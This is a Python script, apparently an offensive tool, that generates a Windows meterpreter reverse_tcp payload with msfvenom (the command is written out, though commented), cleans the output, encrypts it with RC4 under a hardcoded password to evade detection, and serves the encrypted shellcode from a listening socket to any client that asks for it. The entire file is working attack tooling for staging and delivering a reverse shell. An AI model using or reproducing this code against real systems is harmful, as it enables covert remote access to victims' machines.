import os
from Crypto.Cipher import ARC4
import socket
import sys
# -*- coding: utf-8 -*-

#--------------------------------------------------------------------------------------------------------------

def create_payload_msfvenom(lhost, lport, file):
	print('+ Creating payload ...')
	
	#system_call = 'msfvenom --arch x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=' + lhost + ' lport=' + lport + ' -f python -o ' + file
	#print('\n'+system_call+'\n')

	#result = os.system(system_call)
	result = 0
	if result == 0:
		print('+ Payload created and saved as: ' + file)
	else:
		print('+ Payload not created, something went wrong!!')

#--------------------------------------------------------------------------------------------------------------

def clean_payload_msfvenom(file):
	try:
		payload_file = open(file,'r')
		payload_readed = payload_file.read()
		payload_readed = payload_readed.replace('buf','')
		payload_readed = payload_readed.replace('=','')
		payload_readed = payload_readed.replace('+','')
		payload_readed = payload_readed.replace('"','')
		payload_readed = payload_readed.replace(' ','')
		payload_readed = payload_readed.replace('\\x','')
		payload_readed = payload_readed.replace('\n','')

		return payload_readed

	except IOError:
		print('+ It could not be possible to open the payload file, something went wrong!!')

#--------------------------------------------------------------------------------------------------------------

def encrypt_payload(payload, password):
	obj = ARC4.new(password)
	payload_encrypted = obj.encrypt(payload)

	return payload_encrypted

#--------------------------------------------------------------------------------------------------------------

def decrypt_payload(payload_encrypted, password):
	obj = ARC4.new(password)
	payload_decrypted = obj.decrypt(payload_encrypted)

	return payload_decrypted

#--------------------------------------------------------------------------------------------------------------

def create_socket(ip_address, port, payload_to_send):

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	sock_ip_address = ip_address
	sock_port = port
	server_address = (sock_ip_address, sock_port)
	sock.bind(server_address)
	sock.listen(1)
	print('+ Socket created and listening on ' + ip_address + ':' + str(port))
	connection, client_address = sock.accept()

	with connection:
		print('+ + Connected by ', client_address)
		connection.sendall(b'Type "exit" to end session\n')
		connection.sendall(b'Type "receive" to get the payload\n')
		while True:
			data = connection.recv(1024)
			message = data.decode('utf-8')
			if message == 'exit\n':
				print('+ + Session exited by client!!')
				sock.close()
				break
			elif message == 'receive\n':
				print('+ + Sending payload to client ...')
				connection.sendall(payload_to_send)
			else:
				print(message)

#--------------------------------------------------------------------------------------------------------------

def write_screen(message):
	spacesB = int(len(message)/2)
	spacesA = spacesB
	hyphen = int(len(message)*2)-1
	if (len(message)%2 == 0):
		spacesA -= 1

	print('+' + '-' * hyphen + '+')
	print('|' + ' ' * spacesB + message + ' ' * spacesA + '|')
	print('+' + '-' * hyphen + '+')

#--------------------------------------------------------------------------------------------------------------

if __name__ == '__main__':
	print('\n')
	write_screen("Script started")

	password = 'spiderman'
	ip_address = '0.0.0.0'
	port = 4567

	create_payload_msfvenom('192.168.1.50','4444', 'payload.txt')

#	print("\n\n--------------------------------------------------------------------------------------------------------------")
	payload_cleaned = clean_payload_msfvenom('payload.txt')
#	print(payload_cleaned)

#	print("\n\n--------------------------------------------------------------------------------------------------------------")
	payload_encrypted = encrypt_payload(payload_cleaned, password)
#	print(payload_encrypted)

	#print("\n\n--------------------------------------------------------------------------------------------------------------")
	#payload_decrypted = decrypt_payload(payload_encrypted, password)
	#print(payload_decrypted)

	create_socket(ip_address, port, payload_encrypted)

	write_screen("Script finished")
	print('\n')